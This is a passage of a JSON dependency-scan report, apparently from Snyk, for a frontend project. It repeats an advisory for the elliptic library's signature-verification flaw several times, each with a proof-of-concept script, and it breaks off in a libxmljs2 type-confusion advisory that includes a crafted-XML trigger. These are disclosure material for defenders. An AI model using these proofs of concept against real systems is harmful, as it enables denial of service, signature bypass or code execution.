'04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/wallet@5.8.0",
          "@ethersproject/json-wallets@5.8.0",
          "@ethersproject/hdnode@5.8.0",
          "@ethersproject/abstract-signer@5.8.0",
          "@ethersproject/abstract-provider@5.8.0",
          "@ethersproject/transactions@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/json-wallets@5.8.0",
          "@ethersproject/hdnode@5.8.0",
          "@ethersproject/wordlists@5.8.0",
          "@ethersproject/hash@5.8.0",
          "@ethersproject/abstract-signer@5.8.0",
          "@ethersproject/abstract-provider@5.8.0",
          "@ethersproject/transactions@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/wallet@5.8.0",
          "@ethersproject/hdnode@5.8.0",
          "@ethersproject/wordlists@5.8.0",
          "@ethersproject/hash@5.8.0",
          "@ethersproject/abstract-signer@5.8.0",
          "@ethersproject/abstract-provider@5.8.0",
          "@ethersproject/transactions@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-ELLIPTIC-8187303",
        "title": "Improper Verification of Cryptographic Signature",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
        "credit": [
          "Markus Schiffermüller and Scott Arciszewski"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "critical",
        "cvssScore": 9.3,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "elliptic",
        "references": [
          {
            "url": "https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf",
            "title": "GitHub Commit"
          },
          {
            "url": "https://github.com/indutny/elliptic/issues/321",
            "title": "GitHub Issue"
          },
          {
            "url": "https://github.com/indutny/elliptic/pull/322%23issuecomment-2463004218",
            "title": "GitHub PR"
          }
        ],
        "cvssDetails": [
          {
            "assigner": "Red Hat",
            "severity": "low",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "cvssV3BaseScore": 3.7,
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "assigner": "SUSE",
            "severity": "medium",
            "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "cvssV3BaseScore": 4.8,
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.3,
            "cvssVersion": "4.0",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N/E:P",
            "assigner": "Snyk",
            "severity": "critical",
            "baseScore": 9.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-01T06:36:09.951681Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
            "assigner": "Red Hat",
            "severity": "low",
            "baseScore": 3.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-16T14:57:58.718718Z"
          },
          {
            "type": "secondary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:L",
            "assigner": "SUSE",
            "severity": "medium",
            "baseScore": 4.8,
            "cvssVersion": "3.1",
            "modificationTime": "2024-10-30T11:04:15.089640Z"
          }
        ],
        "description": "## Overview\n[elliptic](https://www.npmjs.com/package/elliptic) is a fast elliptic-curve cryptography implementation in plain javascript.\n\nAffected versions of this package are vulnerable to Improper Verification of Cryptographic Signature due to an anomaly in the `_truncateToN` function. An attacker can cause legitimate transactions or communications to be incorrectly flagged as invalid by exploiting the signature verification process when the hash contains at least four leading 0 bytes, and the order of the elliptic curve's base point is smaller than the hash.\r\n\r\nIn some situations, a private key exposure is possible. This can happen when an attacker knows a faulty and the corresponding correct signature for the same message.\r\n\r\n**Note:** Although the vector for exploitation of this vulnerability was restricted with the release of versions 6.6.0 and 6.6.1, it remains possible to generate invalid signatures in some cases in those releases as well.\n## PoC\n```javascript\r\nvar elliptic = require('elliptic'); // tested with version 6.5.7\r\nvar hash = require('hash.js');\r\nvar BN = require('bn.js');\r\nvar toArray = elliptic.utils.toArray;\r\n\r\nvar ec = new elliptic.ec('p192');\r\nvar msg = '343236343739373234';\r\nvar sig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b';\r\n// Same public key just in different formats\r\nvar pk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723';\r\nvar pkPem = '-----BEGIN PUBLIC KEY-----\\nMEkwEwYHKoZIzj0CAQYIKoZIzj0DAQEDMgAEzTWgsY7rj82H/wGXgAEoKHRfBG54\\nXeuigVDeG+bLQ3ZSMAa+/zD/CbQEkSXO0pcj\\n-----END PUBLIC KEY-----\\n';\r\n\r\n// Create hash\r\nvar hashArray = hash.sha256().update(toArray(msg, 'hex')).digest();\r\n// Convert array to string (just for showcase of the leading zeros)\r\nvar hashStr = Array.from(hashArray, function(byte) {\r\n  return ('0' + (byte & 0xFF).toString(16)).slice(-2);\r\n}).join('');\r\nvar hMsg = new BN(hashArray, 'hex');\r\n// Hashed message contains 4 leading zeros bytes\r\nconsole.log('sha256 hash(str): ' + hashStr);\r\n// Due to using BN bitLength lib it does not calculate the bit length correctly (should be 32 since it is a sha256 hash)\r\nconsole.log('Byte len of sha256 hash: ' + hMsg.byteLength());\r\nconsole.log('sha256 hash(BN): ' + hMsg.toString(16));\r\n\r\n// Due to the shift of the message to be within the order of the curve the delta computation is invalid\r\nvar pubKey = ec.keyFromPublic(toArray(pk, 'hex'));\r\nconsole.log('Valid signature: ' + pubKey.verify(hashStr, sig));\r\n\r\n// You can check that this hash should validate by consolidating openssl\r\nconst fs = require('fs');\r\nfs.writeFile('msg.bin', new BN(msg, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('sig.bin', new BN(sig, 16).toBuffer(), (err) => {\r\n  if (err) throw err;\r\n});\r\nfs.writeFile('cert.pem', pkPem, (err) => {\r\n  if (err) throw err;\r\n});\r\n\r\n// To verify the correctness of the message signature and key one can run:\r\n// openssl dgst -sha256 -verify cert.pem -signature sig.bin msg.bin\r\n// Or run this python script\r\n/*\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.asymmetric import ec\r\n\r\n\r\nmsg = '343236343739373234'\r\nsig = '303502186f20676c0d04fc40ea55d5702f798355787363a91e97a7e50219009d1c8c171b2b02e7d791c204c17cea4cf556a2034288885b'\r\npk = '04cd35a0b18eeb8fcd87ff019780012828745f046e785deba28150de1be6cb4376523006beff30ff09b4049125ced29723'\r\n\r\np192 = ec.SECP192R1()\r\npk = ec.EllipticCurvePublicKey.from_encoded_point(p192, bytes.fromhex(pk))\r\npk.verify(bytes.fromhex(sig), bytes.fromhex(msg), ec.ECDSA(hashes.SHA256()))\r\n*/\r\n```\n## Remediation\nThere is no fixed version for `elliptic`.\n## References\n- [GitHub Commit](https://github.com/indutny/elliptic/commit/34c853478cec1be4e37260ed2cb12cdbdc6402cf)\n- [GitHub Issue](https://github.com/indutny/elliptic/issues/321)\n- [GitHub PR](https://github.com/indutny/elliptic/pull/322#issuecomment-2463004218)\n",
        "epssDetails": {
          "percentile": "0.22905",
          "probability": "0.00073",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-48948"
          ],
          "CWE": [
            "CWE-347"
          ],
          "GHSA": [
            "GHSA-fc9h-whq2-v747"
          ]
        },
        "packageName": "elliptic",
        "proprietary": false,
        "creationTime": "2024-10-15T14:28:04.889614Z",
        "functions_new": [],
        "alternativeIds": [],
        "disclosureTime": "2024-10-15T13:45:59Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Proof of Concept",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2024-10-15T14:28:05.206234Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2025-06-01T06:36:09.951681Z",
        "socialTrendAlert": false,
        "severityWithCritical": "critical",
        "from": [
          "frontend@19.0.0",
          "ethers@5.8.0",
          "@ethersproject/wallet@5.8.0",
          "@ethersproject/json-wallets@5.8.0",
          "@ethersproject/hdnode@5.8.0",
          "@ethersproject/wordlists@5.8.0",
          "@ethersproject/hash@5.8.0",
          "@ethersproject/abstract-signer@5.8.0",
          "@ethersproject/abstract-provider@5.8.0",
          "@ethersproject/transactions@5.8.0",
          "@ethersproject/signing-key@5.8.0",
          "elliptic@6.6.1"
        ],
        "upgradePath": [
          false,
          "ethers@6.0.0"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "elliptic",
        "version": "6.6.1"
      },
      {
        "id": "SNYK-JS-LIBXMLJS2-6808810",
        "title": "Type Confusion",
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
        "credit": [
          "Uriya Yavnieli"
        ],
        "semver": {
          "vulnerable": [
            "*"
          ]
        },
        "exploit": "Proof of Concept",
        "fixedIn": [],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "high",
        "cvssScore": 8.1,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "libxmljs2",
        "references": [
          {
            "url": "https://github.com/marudor/libxmljs2/issues/204",
            "title": "GitHub Issue"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 8.1,
            "cvssVersion": "3.1",
            "modificationTime": "2025-06-02T08:09:07.427550Z"
          }
        ],
        "description": "## Overview\n[libxmljs2](https://www.npmjs.org/package/libxmljs2) is a libxml bindings for v8 javascript engine\n\nAffected versions of this package are vulnerable to Type Confusion due to the improper handling of a specially crafted XML file. An attacker can cause a denial of service, data leak, infinite loop, or execute arbitrary code by invoking a function on the result of `attrs()` that was called on a parsed node.\n## PoC\n```js\n\nconst libxmljs2 = require('libxmljs2');\n\nvar d = `<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE note\n[\n<!ENTITY writer `\" + 'A'.repeat(0x1234) + `\">\n]>\n<from>&writer;</from>\n`;\n\nt = libxmljs2.parseXml(d, {flags: [libxmljs2.XMLParseFlags.XML_PARSE_HUGE]})\nfrom = t.get('//from')\nc = from.childNodes()[0]\nc2 = c.childNodes()[0]\nc2_attrs = c2.attrs()\n```\n## Remediation\nThere is no fixed version for `libxmljs2`.\n\n## References\n- [GitHub Issue](https://github.com/marudor/libxmljs2/issues/204)\n",
        "epssDetails": {
          "percentile": "0.86712",
          "probability": "0.03260",
          "modelVersion": "v2025.03.14"
        },
        "identifiers": {
          "CVE": [
            "CVE-2024-34393"
          ],
          "CWE": [
            "CWE-843"
          ],
          "GHSA": [
            "GHSA-mjr4-7xg5-pfvh"
          ]
        },
        "packageName": "libxmljs2",
        "proprietary": false,
        "creationTime": "2024-05-05T10:25:25.434709Z",
        "functions_new": [],
        "alternativeIds": [],
